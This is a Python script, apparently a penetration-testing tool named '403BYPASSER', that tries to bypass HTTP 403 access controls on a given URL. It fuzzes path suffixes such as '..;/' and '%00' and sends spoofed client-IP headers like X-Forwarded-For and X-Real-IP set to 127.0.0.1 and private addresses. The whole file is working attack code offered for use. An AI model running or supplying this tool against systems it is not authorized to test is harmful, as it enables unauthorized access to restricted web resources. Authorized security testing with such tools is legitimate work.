#!/usr/bin/python3

import requests
import argparse
import time
import random
import threading
from termcolor import colored, cprint
import pyfiglet

result = pyfiglet.figlet_format("403BYPASSER")
start_time = time.strftime("%H:%M:%S")


class fuzzer:

    def __init__(self):
        self.color = ["yellow", "red", "blue", "white"]
        print(colored(result, 'yellow'))
        cprint(f"start time : {start_time}")
        print("--------------------------------------------------------------------------------------------")
        self.list = ["/", "..;/", "/..;/", "%20", "%09", "%00",
                     ".json", ".css", ".html", "?", "??", "???",
                     "?testparam", "#", "#test", "/."]

        self.header = ["X-Custom-IP-Authorization", "X-Forwarded-For",
                       "X-Forward-For", "X-Remote-IP", "X-Originating-IP",
                       "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]

    def argument(self):
        self.argparser = argparse.ArgumentParser()
        self.argparser.add_argument(
            "-u", "--url", type=str, help="please give the url in given format \
            [**] http://example.com/dir/ [**]")
        self.args = self.argparser.parse_args()

    def bypasser(self, commment):
        try:
            self.responce = requests.get(commment)
            self.code = self.responce.status_code
            self.payload = commment

            self.main_mes = f"[+] {colored(self.responce.status_code,'blue')} [+] ## [+] {colored(commment,'red')} [+]"
            for self.res in self.main_mes:
                print(self.res, end='', flush=True)
                time.sleep(0.01)
            print("\n")
        except Exception as e:
            print("  [-] something wrong happen  [-]")
        except IndexError:
            pass

    def thread(self):
        self.ip = ["127.0.0.1", "127.0.0.1:80",
                   "127.0.0.1:443", "2130706433", "192.168.0.1"]
        try:
            self.message = "Using character payloads"
            for i in self.message:
                print(colored(i, random.choice(self.color)), end='', flush=True)
                time.sleep(0.1)

            print("\n")
            for self.count in self.list:
                self.main_url = self.args.url + self.count
                t = threading.Thread(target=self.bypasser,
                                     args=(self.main_url, ))
                t.start()
                t.join()

            print(
                "--------------------------------------------------------------------------------------------")

            self.message = "Using headers"
            for i in self.message:
                print(colored(i, random.choice(self.color)), end='', flush=True)
                time.sleep(0.1)

            print("\n")
            for self.head in self.header:
                for self.ipaddress in self.ip:
                    try:
                        self.header_main = {self.head: self.ipaddress}
                        self.res = requests.get(
                            self.args.url, headers=self.header_main)
                        print(
                            f"[+] {colored(self.res.status_code,'blue')} [+] ## [+] {colored(self.args.url,'red')} [+] ## [+] {self.header_main} [+]")
                    except Exception as e:
                        print(e)

        except threading.ThreadError:
            print("[-] thread error is occur [-]")


def main():
    try:
        fuzz = fuzzer()
        fuzz.argument()
        fuzz.thread()
    except KeyboardInterrupt:
        print("\n")
        print(colored("KEYBOARD INTERRUPT :: THANKS FOR USING TOOL", "red"))


main()
